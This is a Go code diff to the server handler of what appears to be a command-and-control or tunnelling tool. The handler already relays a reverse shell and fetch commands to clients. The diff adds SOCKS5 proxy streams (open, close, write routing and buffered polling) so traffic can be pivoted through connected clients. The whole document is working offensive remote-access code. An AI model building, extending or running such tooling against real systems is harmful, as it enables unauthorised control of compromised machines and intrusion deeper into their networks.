@@ -240,6 +240,12 @@ func (h *Handler) processCommand(pkt *protocol.Packet, clientID byte, src string
 		return h.handleFetch(pkt, clientID)
 	case protocol.CmdRShell:
 		return h.handleRShell(pkt, clientID)
+	case protocol.CmdSocks5:
+		return h.handleSocks5Start(pkt, clientID)
+	case protocol.CmdStreamOpen:
+		return h.handleStreamOpen(pkt, clientID)
+	case protocol.CmdStreamClose:
+		return h.handleStreamClose(pkt, clientID)
 	default:
 		log.Printf("unknown command: %c", pkt.Cmd)
 		return errorFrame()
@@ -271,6 +277,17 @@ func (h *Handler) handlePoll(pkt *protocol.Packet, clientID byte) *protocol.Fram
 	if session.RShell != nil {
 		maxPayload := h.responsePayloadSize(session)
 		data, more := session.RShell.ReadFromTCP(maxPayload)
+		flags := byte(0)
+		if more {
+			flags |= protocol.FlagMoreData
+		}
+		return &protocol.Frame{Flags: flags, Payload: data}
+	}
+
+	// If SOCKS5 is active, return buffered stream data
+	if session.Socks5 != nil {
+		maxPayload := h.responsePayloadSize(session)
+		data, more := session.Socks5.readFromStreams(maxPayload)
 		flags := byte(0)
 		if more {
 			flags |= protocol.FlagMoreData
@@ -316,7 +333,15 @@ func (h *Handler) handleData(pkt *protocol.Packet, clientID byte) *protocol.Fram
 	}
 
 	// Route data to the appropriate destination
-	if session.RShell != nil && len(pkt.Payload) > 0 {
+	if session.Socks5 != nil && len(pkt.Payload) > 2 {
+		// SOCKS5: parse stream ID and route to stream
+		streamID := uint16(pkt.Payload[0])<<8 | uint16(pkt.Payload[1])
+		if err := session.Socks5.writeToStream(streamID, pkt.Payload[2:]); err != nil {
+			if h.config.Verbose {
+				log.Printf("client %d: socks5 stream %d write error: %v", clientID, streamID, err)
+			}
+		}
+	} else if session.RShell != nil && len(pkt.Payload) > 0 {
 		// Reverse shell: forward to TCP connection
 		if err := session.RShell.WriteToTCP(pkt.Payload); err != nil {
 			log.Printf("client %d: rshell write error: %v", clientID, err)
